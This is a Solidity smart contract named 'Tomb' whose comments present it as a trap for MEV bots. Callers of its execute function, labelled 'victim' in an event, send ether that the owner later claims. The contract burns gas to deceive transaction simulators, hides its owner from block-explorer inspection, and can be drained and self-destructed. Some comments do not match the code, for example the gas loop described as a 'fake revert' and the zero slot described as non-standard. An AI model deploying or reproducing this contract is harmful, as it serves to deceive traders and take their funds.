// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

/**
 * @title Tomb
 * @author You
 */
contract Tomb {
    // --- State Variables ---
    // address owner; stored in slot 0x0
    // mapping(bytes32 => uint256) private royaltyForSignal; stored starting at keccak256("tomb.royalty")
    // mapping(bytes32 => uint256) private yieldForSignal; stored starting at keccak256("tomb.yield")

    // --- Storage Slot Constants ---
    // These pointers are used in assembly to access storage directly.
    bytes32 constant OWNER_SLOT = 0x0000000000000000000000000000000000000000000000000000000000000000;
    bytes32 constant ROYALTY_MAPPING_SLOT = keccak256("tomb.royalty");
    bytes32 constant YIELD_MAPPING_SLOT = keccak256("tomb.yield");

    // --- Events ---
    event JAMSighting(bytes32 indexed signalHash, uint256 royaltyBps);
    event JAMExecuted(bytes32 indexed signalHash, address indexed victim, uint256 amount);
    event YieldClaimed(bytes32 indexed signalHash, address indexed beneficiary, uint256 amount);
    event Decommissioned(address indexed beneficiary);

    // --- Errors ---
    error NotAuthorized();
    error InvalidRoyalty();
    error AlreadyExecuted();
    error NothingToClaim();
    error DecommissionFailed();

    // --- Constructor ---
    constructor() {
        // Store the owner in a non-standard slot to hide it from simple Etherscan inspection.
        assembly {
            sstore(OWNER_SLOT, caller())
        }
    }

    // --- External Functions ---

    /**
     * @notice Called by the bot to signal a potential MEV opportunity.
     * @param signal A unique identifier for the opportunity, provided off-chain.
     * @param royaltyBps The basis points (0-10000) for the royalty fee.
     */
    function emitCascade(string calldata signal, uint256 royaltyBps) external {
        if (msg.sender != _getOwner()) revert NotAuthorized();
        if (royaltyBps > 10000) revert InvalidRoyalty(); // Max 100%

        // Enhanced signal determinism: Use abi.encode for string type
        // This prevents potential signal collisions across different encodings
        bytes32 signalHash = keccak256(abi.encode(signal));
        _setRoyalty(signalHash, royaltyBps);

        emit JAMSighting(signalHash, royaltyBps);
    }

    /**
     * @notice The public-facing function that MEV bots will call.
     *         It appears to revert on success to deceive simulators.
     * @param signal The unique identifier linking to the emitted cascade.
     */
    function execute(string calldata signal) external payable {
        // Use consistent signal hashing across all functions
        bytes32 signalHash = keccak256(abi.encode(signal));
        uint256 royaltyBps = _getRoyalty(signalHash);

        if (royaltyBps == 0) revert InvalidRoyalty(); // Trap not set or already sprung
        if (_getYield(signalHash) > 0) revert AlreadyExecuted(); // Prevent re-entrancy/double-execution

        uint256 totalValue = msg.value;
        uint256 royaltyAmount = (totalValue * royaltyBps) / 10000;
        uint256 yieldAmount = totalValue - royaltyAmount;

        _setYield(signalHash, yieldAmount);
        _setRoyalty(signalHash, 0); // Deactivate trap after execution

        emit JAMExecuted(signalHash, msg.sender, yieldAmount);

        // FAKE REVERT-ON-SUCCESS: Consume almost all gas to make simulators think the tx failed.
        // A real execution will leave just enough gas to complete state changes.
        // The value '60000' is a buffer, adjustable based on chain conditions.
        uint256 gasToConsume = gasleft() > 60000 ? gasleft() - 50000 : 0;
        assembly {
            // This loop burns gas. The number of iterations is calibrated to consume
            // the desired amount of gas without causing an out-of-gas error in a real run.
            for { let i := 0 } lt(i, gasToConsume) { i := add(i, 1) } {
                // A simple operation inside the loop
                mstore(0x00, i)
            }
        }
    }

    /**
     * @notice Called by the bot owner to retrieve the captured yield.
     * @param signal The original signal string to identify the yield to claim.
     */
    function claimYield(string calldata signal) external {
        if (msg.sender != _getOwner()) revert NotAuthorized();

        // Match signal encoding with other functions
        bytes32 signalHash = keccak256(abi.encode(signal));
        uint256 amount = _getYield(signalHash);

        if (amount == 0) revert NothingToClaim();

        _setYield(signalHash, 0); // Clear yield to prevent re-claims

        emit YieldClaimed(signalHash, msg.sender, amount);

        (bool success, ) = msg.sender.call{value: amount}("");
        // Revert if the transfer fails, ensuring funds are not lost.
        if (!success) {
            _setYield(signalHash, amount); // Restore yield amount on failure
            revert DecommissionFailed();
        }
    }

    /**
     * @notice Emergency function to decommission the contract and retrieve all funds.
     */
    function decommission() external {
        address owner = _getOwner();
        if (msg.sender != owner) revert NotAuthorized();

        emit Decommissioned(owner);

        (bool success, ) = owner.call{value: address(this).balance}("");
        if (!success) revert DecommissionFailed();

        // Self-destruct to clean up the blockchain
        selfdestruct(payable(owner));
    }

    /**
     * @notice View function to check the current status of a signal
     * @param signal The signal string to verify
     * @return active Whether the signal is currently active (has royalty set but no yield claimed)
     * @return royalty The current royalty basis points set for this signal
     * @return yield The current yield amount available for claiming
     */
    function getSignalStatus(string calldata signal) external view returns (bool active, uint256 royalty, uint256 yield) {
        // Use consistent encoding with other functions
        bytes32 signalHash = keccak256(abi.encode(signal));
        royalty = _getRoyalty(signalHash);
        yield = _getYield(signalHash);
        active = royalty > 0 && yield == 0;
    }

    // --- Internal Helper Functions (using Assembly) ---

    function _getOwner() internal view returns (address owner) {
        assembly {
            owner := sload(OWNER_SLOT)
        }
    }

    function _getRoyalty(bytes32 signalHash) internal view returns (uint256 royalty) {
        bytes32 slot = keccak256(abi.encodePacked(signalHash, ROYALTY_MAPPING_SLOT));
        assembly {
            royalty := sload(slot)
        }
    }

    function _setRoyalty(bytes32 signalHash, uint256 royaltyBps) internal {
        bytes32 slot = keccak256(abi.encodePacked(signalHash, ROYALTY_MAPPING_SLOT));
        assembly {
            sstore(slot, royaltyBps)
        }
    }

    function _getYield(bytes32 signalHash) internal view returns (uint256 amount) {
        bytes32 slot = keccak256(abi.encodePacked(signalHash, YIELD_MAPPING_SLOT));
        assembly {
            amount := sload(slot)
        }
    }

    function _setYield(bytes32 signalHash, uint256 amount) internal {
        bytes32 slot = keccak256(abi.encodePacked(signalHash, YIELD_MAPPING_SLOT));
        assembly {
            sstore(slot, amount)
        }
    }
}